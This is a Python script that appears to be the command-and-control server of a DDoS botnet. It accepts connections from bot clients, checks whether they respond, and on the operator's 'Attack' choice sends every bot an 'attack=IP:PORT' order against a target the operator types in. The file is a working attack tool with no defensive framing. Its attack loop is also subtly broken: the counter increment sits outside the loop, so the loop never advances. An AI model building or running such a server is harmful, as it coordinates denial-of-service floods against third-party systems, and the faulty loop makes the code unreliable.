import socket,threading,sys,ipaddress

DEFAULT_TIMEOUT = 3
CONNECTED_CLIENTS = []
STARTED = True

def main():
    global STARTED
    while STARTED:
        action = 0
        try:
            action = int(input("0: Exit\n1: Check connections\n2: Attack\n"))
        except ValueError as e:
            print(e)
            continue
        if action == 0:
            # Exit
            STARTED = False
            for client in CONNECTED_CLIENTS:
                client.send(b'end')
                client.close()
        elif action == 1:
            # Check connections
            i = 0
            while i < len(CONNECTED_CLIENTS):
                client = CONNECTED_CLIENTS[i]
                client.send(b'check_conn')
                client.settimeout(DEFAULT_TIMEOUT)
                addr, _ = client.getsockname()
                response = ""
                try:
                    response = client.recv(1024).decode()
                    if len(response) == 0: raise Exception
                    print(f"[{addr}]: Ok.")
                except Exception:
                    print(f"[{addr}]: No response.")
                    CONNECTED_CLIENTS.remove(client)
                    print(f"[{addr}]: Disconnected.")
                    client.close()
                i += 1
        elif action == 2:
            # Attack
            while True:
                try:
                    target = input("Target (IP:PORT): ").split(":")
                    targetAddress, targetPort = target[0], int(target[1])
                    ipaddress.ip_address(targetAddress)
                    if targetPort < 0 or targetPort > 65535: raise ValueError
                    break
                except Exception:
                    continue
            i = 0
            while i < len(CONNECTED_CLIENTS):
                client = CONNECTED_CLIENTS[i]
                client.send((f"attack={targetAddress}:{targetPort}").encode())
                client.settimeout(DEFAULT_TIMEOUT)
                addr, _ = client.getsockname()
                response = ""
                try:
                    response = client.recv(1024).decode()
                    if len(response) == 0: raise Exception
                    if response == "attacking=true":
                        print(f"[{addr}]: Attacking")
                except Exception:
                    print(f"[{addr}]: No response.")
                    CONNECTED_CLIENTS.remove(client)
                    print(f"[{addr}]: Disconnected.")
                    client.close()
            i += 1
                
        else:
            continue
    return 0

def accept_clients():
    global STARTED
    while STARTED:
        try:
            server_socket.settimeout(DEFAULT_TIMEOUT)
            client, (addr,_) = server_socket.accept()
            CONNECTED_CLIENTS.append(client)
            print(f"[{addr}]: Connected")
        except socket.timeout:
            continue
    
if __name__ == "__main__":
    try:
        if len(sys.argv) != 2: raise Exception("Argument missing: [IP:PORT]")
        arg = sys.argv[1].split(":")
        server_ip, server_port = arg[0], int(arg[1])
        ipaddress.ip_address(server_ip)
        if server_port < 1024 or server_port > 65535: raise ValueError
    except Exception as e:
        print(e)
        exit()
    
    server_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server_socket.bind((server_ip,server_port))
    server_socket.listen(20)
    
    threading.Thread(target=accept_clients).start()
    threading.Thread(target=main).start()